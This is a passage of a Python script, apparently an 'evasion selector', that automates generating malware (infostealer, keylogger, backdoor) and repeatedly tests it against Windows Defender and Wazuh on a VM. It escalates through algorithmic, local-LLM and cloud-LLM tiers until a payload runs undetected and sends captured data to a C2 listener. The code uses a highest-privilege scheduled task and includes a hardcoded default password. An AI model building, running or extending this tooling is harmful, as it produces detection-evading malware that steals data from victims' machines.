                       shell=True, capture_output=True)
        time.sleep(2)

        exists = subprocess.run(f"{ssh} 'if exist C:\\Users\\{vm_user}\\Desktop\\payload.exe (echo EXISTS) else (echo GONE)'",
                                shell=True, capture_output=True, text=True)
        if "GONE" in exists.stdout:
            det_cmd = get_detection_cmd()
            det = subprocess.run(f"""{ssh} '{det_cmd}'""",
                                 shell=True, capture_output=True, text=True)
            det_text = det.stdout.strip()
            wazuh_det = check_wazuh_indexer(minutes=3, min_level=5)
            if wazuh_det:
                det_text = f"{det_text}\n{wazuh_det}" if det_text else wazuh_det
            print(f" QUARANTINED\n    {det_text[:200]}", flush=True)
            record_run(config, detected=True, detection_text=det_text, success=False)
            os.unlink(exe_path)
            history = load_history()
            results_log.append("X")
            continue
        print(" OK (survived Defender)", flush=True)

        print("  [5/5] Executing + C2 capture...", end="", flush=True)
        c2_out = tempfile.mktemp(suffix=".bin")
        subprocess.run(f"fuser -k {c2_port}/tcp", shell=True, capture_output=True)
        time.sleep(0.5)
        c2_script = (
            f"import socket\n"
            f"srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
            f"srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
            f"srv.bind(('0.0.0.0', {c2_port})); srv.listen(1); srv.settimeout(90)\n"
            f"try:\n"
            f"    conn, addr = srv.accept()\n"
            f"    data = b''; conn.settimeout(30)\n"
            f"    while True:\n"
            f"        try:\n"
            f"            chunk = conn.recv(65536)\n"
            f"            if not chunk: break\n"
            f"            data += chunk\n"
            f"        except socket.timeout: break\n"
            f"    conn.close()\n"
            f"    with open('{c2_out}', 'wb') as f: f.write(data)\n"
            f"except socket.timeout:\n"
            f"    open('{c2_out}', 'wb').close()\n"
            f"srv.close()\n"
        )
        listener = subprocess.Popen(["python3", "-u", "-c", c2_script])
        time.sleep(1)
        if malware_type == "keylogger":
            subprocess.run(f"{ssh} 'schtasks /create /tn evasion_test /tr "
                           f"\"C:\\Users\\{vm_user}\\Desktop\\payload.exe --batch 15\" "
                           f"/sc once /st 00:00 /f /it /rl highest'",
                           shell=True, capture_output=True)
            subprocess.run(f"{ssh} 'schtasks /run /tn evasion_test'",
                           shell=True, capture_output=True)
        else:
            subprocess.Popen(f"{ssh} 'cmd /c \"C:\\Users\\{vm_user}\\Desktop\\payload.exe\"'",
                             shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        listener.wait()
        if malware_type == "keylogger":
            subprocess.run(f"{ssh} 'schtasks /delete /tn evasion_test /f'",
                           shell=True, capture_output=True)
        os.unlink(exe_path)

        c2_size = os.path.getsize(c2_out) if os.path.exists(c2_out) else 0
        time.sleep(5)
        # VM cleanup
        subprocess.run(f"{ssh} 'taskkill /f /im payload.exe 2>NUL'",
                       shell=True, capture_output=True)
        subprocess.run(f"{ssh} 'del \"C:\\Users\\{vm_user}\\Desktop\\payload.exe\" 2>NUL'",
                       shell=True, capture_output=True)
        wazuh_det = check_wazuh_indexer(minutes=3, min_level=8)
        c2_threshold = 4 if malware_type == "backdoor" else 100
        if c2_size > c2_threshold and not wazuh_det:
            print(f" SUCCESS ({c2_size:,} bytes)", flush=True)
            record_run(config, detected=False, success=True)
            if os.path.exists(c2_out):
                os.unlink(c2_out)
            results_log.append("S")
            # ── Final success summary ──
            print(f"\n{'='*60}", flush=True)
            bar = "#" * 30
            print(f"  [{bar}] SUCCESS on run {run_num}/{max_total}", flush=True)
            print(f"  Defender: 0 | Wazuh: 0 high | C2: {c2_size:,} bytes", flush=True)
            print(f"  History: {''.join(results_log)}", flush=True)
            print(f"{'='*60}", flush=True)
            return True, config, run_num, load_history()
        else:
            det_cmd = get_detection_cmd()
            det = subprocess.run(f"""{ssh} '{det_cmd}'""",
                                 shell=True, capture_output=True, text=True)
            det_text = det.stdout.strip()
            if wazuh_det:
                det_text = f"{det_text}\n{wazuh_det}" if det_text else wazuh_det
            detected = bool(det_text)
            if wazuh_det:
                print(f" WAZUH ALERT\n    {wazuh_det[:200]}", flush=True)
                results_log.append("W")
            elif detected:
                print(f" DETECTED\n    {det_text[:200]}", flush=True)
                results_log.append("X")
            else:
                print(f" no C2 data ({c2_size} bytes)", flush=True)
                results_log.append("?")
            record_run(config, detected=detected, detection_text=det_text or "no_c2_data", success=False)
            if os.path.exists(c2_out):
                os.unlink(c2_out)
            history = load_history()

    # ── Final failure summary ──
    print(f"\n{'='*60}", flush=True)
    print(f"  FAILED after {max_total} runs", flush=True)
    print(f"  History: {''.join(results_log)}", flush=True)
    counts = {"S": 0, "X": 0, "E": 0, "?": 0, "D": 0, "W": 0}
    for r in results_log:
        counts[r] = counts.get(r, 0) + 1
    parts = []
    if counts["S"]: parts.append(f"{counts['S']} success")
    if counts["X"]: parts.append(f"{counts['X']} detected (Defender)")
    if counts["W"]: parts.append(f"{counts['W']} detected (Wazuh)")
    if counts["E"]: parts.append(f"{counts['E']} build error")
    if counts["?"]: parts.append(f"{counts['?']} no C2 data")
    if parts:
        print(f"  Summary: {', '.join(parts)}", flush=True)
    print(f"{'='*60}", flush=True)
    return False, config, max_total, load_history()


if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1 and sys.argv[1] == "--run":
        import argparse as _ap
        _p = _ap.ArgumentParser(prog="evasion_selector --run")
        _p.add_argument("malware_type", nargs="?", default="infostealer")
        _p.add_argument("--dry-run", action="store_true")
        _p.add_argument("--max-algo", type=int, default=None)
        _p.add_argument("--max-llm", type=int, default=None)
        _p.add_argument("--max-cloud", type=int, default=None)
        _p.add_argument("--llm-url", default=None)
        _a = _p.parse_args(sys.argv[2:])
        max_algo = _a.max_algo if _a.max_algo is not None else int(os.environ.get("MALGEN_MAX_ALGORITHMIC", "5"))
        max_llm_tier = _a.max_llm if _a.max_llm is not None else int(os.environ.get("MALGEN_MAX_LLM", "3"))
        max_cloud_tier = _a.max_cloud if _a.max_cloud is not None else int(os.environ.get("MALGEN_MAX_CLOUD", "2"))
        llm_url = _a.llm_url or os.environ.get("LLM_URL", None)
        vm_port = int(os.environ.get("VM_PORT", "10022"))
        vm_user = os.environ.get("VM_USER", "vmuser")
        vm_pass = os.environ.get("VM_PASS", "vmuser123")
        c2_port = int(os.environ.get("C2_PORT", "9001"))
        ok, cfg, runs, hist = run_hybrid_loop(
            malware_type=_a.malware_type, dry_run=_a.dry_run,
            max_algorithmic=max_algo, max_llm=max_llm_tier, max_cloud=max_cloud_tier,
            llm_url=llm_url, vm_port=vm_port, vm_user=vm_user, vm_pass=vm_pass,
            c2_port=c2_port,
        )

    elif len(sys.argv) > 1 and sys.argv[1] == "--test":
        detection = "Trojan:Win32/Stealer.G!MTB - Behavior:Win32/SuspiciousProcess"
        print("Testing with detection:", detection, "\n")
        config = select_layers(detection)
        print(format_selection_report(config))

    elif len(sys.argv) > 1 and sys.argv[1] == "--detection":
        detection = sys.argv[2] if len(sys.argv) > 2 else ""
        config = select_layers(detection)
        print(format_selection_report(config))

    else:
        total = 1
        for info in LAYERS.values():
            total *= len(info["options"])
        print(f"Evasion Selector — {total:,} possible combinations")
        print()
        print("Usage:")
        print("  --run [type]                    Run hybrid loop (live VM)")
        print("  --run [type] --dry-run          Simulate without VM")
        print("  --run [type] --max-algo 20      Set Tier 1 algorithmic attempts")
        print("  --run [type] --max-llm 5        Set Tier 2 local LLM attempts")
        print("  --run [type] --max-cloud 3      Set Tier 3 cloud LLM attempts")
        print("  --run [type] --llm-url URL      Local LLM endpoint")
        print("  --test                          Test with sample detection")
        print("  --detection 'text'              Show selection for detection text")
        history = load_history()
        print(f"\nHistory: {len(history.get('runs', []))} runs, "
              f"{len(history.get('successes', []))} successes, "
              f"{len(history.get('detections', []))} detections")
